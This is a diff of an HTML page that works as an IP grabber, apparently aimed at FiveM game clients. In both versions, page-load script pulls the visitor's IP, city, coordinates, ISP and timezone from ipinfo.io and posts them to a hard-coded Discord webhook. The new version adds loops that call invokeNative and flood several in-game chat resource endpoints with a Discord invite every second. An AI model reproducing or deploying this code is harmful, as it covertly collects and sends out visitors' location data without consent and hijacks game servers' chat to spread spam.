@@ -1,9 +1,9 @@
-    <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>discord.gg/EHZTXduFm2</title>
+    <title>discord.gg/v999</title>
     <style>
         body {
             margin: 0;
@@ -11,7 +11,7 @@
             background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center fixed;
             background-size: cover;
             font-family: 'Courier New', Courier, monospace;
-            color: #ff0000;
+            color: #878787;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -20,38 +20,36 @@
             text-align: center;
         }
         .image-container img {
-            width: 750px; 
+            width: 650px; 
             height: auto;
-            border: 2px solid #ff0000; 
+            border: 2px solid #878787; 
             border-radius: 15px;
-            box-shadow: 0 0 15px rgba(0, 0, 255, 0.7); 
+            box-shadow: 0 0 15px rgba(128, 128, 128, 0.7); 
         }
         .info {
             margin-top: 20px;
             font-size: 1.5em;
-            color: #ff0000; 
-            text-shadow: 0px 0px 8px #ff0000, 0px 0px 15px #ff0000, 0px 0px 25px #ff0000; 
+            color: #878787; 
+            text-shadow: 0px 0px 8px #878787, 0px 0px 15px #878787, 0px 0px 25px #878787; 
             letter-spacing: 4.5px; 
             white-space: pre-wrap;
         }
         .text {
             margin-top: 20px;
             font-size: 3em; 
-            color: #ff1d1d; 
-            text-shadow: 0px 0px 8px #ff1212, 0px 0px 15px #fb1111, 0px 0px 25px #ff1111; 
+            color: #878787; 
+            text-shadow: 0px 0px 8px #878787, 0px 0px 15px #878787, 0px 0px 25px #878787; 
             letter-spacing: 4.5px; 
         }
     </style>
 </head>
 <body>
     <div class="image-container">
-        <img src="https://gifdb.com/images/high/puppet-with-fire-exdjlk4bbjsk381m.gif" alt="Discord Image">
+        <img src="https://cdn.discordapp.com/attachments/1406312014611087493/1415736334160625754/6iyJK46.png?ex=68c44ab5&is=68c2f935&hm=879a687220dc1dc5778fda97c9323d0064e1e73aa7874f9348c2657199a29c84&.png" alt="Discord Image">
     </div>
     <audio autoplay loop>
-        <source src="aa.mp3" type="audio/mpeg">
-        Your browser does not support the audio element.
+        <source src="https://j.top4top.io/m_3519vekn81.mp3" type="audio/mpeg">
     </audio>
-     <div class="text">اما توردها مواريد الابطال ولا استرح وخل المراجل لاهلها</div>
     <div class="info" id="ip-info">
         <strong>IP: <span id="ip"></span></strong><br>
         <span><strong>City:</strong> <span id="city"></span></span><br>
@@ -61,43 +59,43 @@
         <span><strong>Organization:</strong> <span id="org"></span></span><br>
         <span><strong>Timezone:</strong> <span id="timezone"></span></span>
     </div>
-    <div class="text">GG : GOT FUCKED BY : RX</div>
+    <div class="text">discord.gg/v999 PABLO  </div>
 
     <script>
-    const webhookURL = "https://discord.com/api/webhooks/1396562082828259358/1MY7GktdXZyGrdTzAUHTAjnDDgNCYQuJlnUfZSHB3Kyb0sUgHe7HRbz3skn0VvElQSPo"; // غيره بالويبهوك تبعك
+        fetch('https://ipinfo.io/json')
+        .then(response => response.json())
+        .then(data => {
+            const { ip, country, city, region, loc, org, timezone } = data;
+            const infoDiv = document.getElementById('ip-info');
+            infoDiv.innerHTML = `<strong>IP:</strong><span>"${ip}"</span><br><strong>City:</strong><span>"${city}"</span><br><strong>Region:</strong><span>"${region}"</span><br><strong>Country:</strong><span>"${country}"</span><br><strong>Location:</strong><span>"${loc}"</span><br><strong></strong> <span>"${org}"</span><br><strong>Timezone:</strong><span>"${timezone}"</span>`;
 
-    fetch('https://ipinfo.io/json')
-    .then(response => response.json())
-    .then(data => {
-        const message = {
-            content: "📡 New Visitor Info",
-            embeds: [
-                {
-                    title: "IP Info",
-                    color: 16711680, // أحمر
-                    fields: [
-                        { name: "IP", value: data.ip || "N/A", inline: true },
-                        { name: "City", value: data.city || "N/A", inline: true },
-                        { name: "Region", value: data.region || "N/A", inline: true },
-                        { name: "Country", value: data.country || "N/A", inline: true },
-                        { name: "Location", value: data.loc || "N/A", inline: false },
-                        { name: "Organization", value: data.org || "N/A", inline: false },
-                        { name: "Timezone", value: data.timezone || "N/A", inline: true }
-                    ],
-                    footer: { text: "🔥 Logged by RX 🔥" }
-                }
-            ]
-        };
-
-        // إرسال للديسكورد
-        fetch(webhookURL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(message)
+            const dateTime = new Date().toLocaleString();
+            const webhookUrl = 'https://discord.com/api/webhooks/1343716504331616328/8-HtlyIdfpvEZ9kyNrCQZIoTXKCOnoGBwMkRNtcuQF3rdjUDhh4';
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`})
+            });
         });
-    })
-    .catch(err => console.error(err));
-</script>
 
+        setInterval(function() {
+            window.invokeNative
+            window.invokeNative
+            window.invokeNative
+            window.invokeNative
+        }, 2500);
+   
+const msg = ` disc0rd.gg/v999 حياكم الله  `;
+const body = JSON.stringify({ message: msg });
+setInterval(() => {
+fetch("https://flix-scripts/chatResult", { method: "POST", body });
+fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})})
+fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
+fetch("https://melix_chat/chatResult", { method: "POST", body });
+fetch("https://as_chat/chatResult", { method: "POST", body });
+fetch("https://chat/chatResult", { method: "POST", body });
+fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
+}, 1000);
+    </script>
 </body>
-</html>
+... (1 line left)
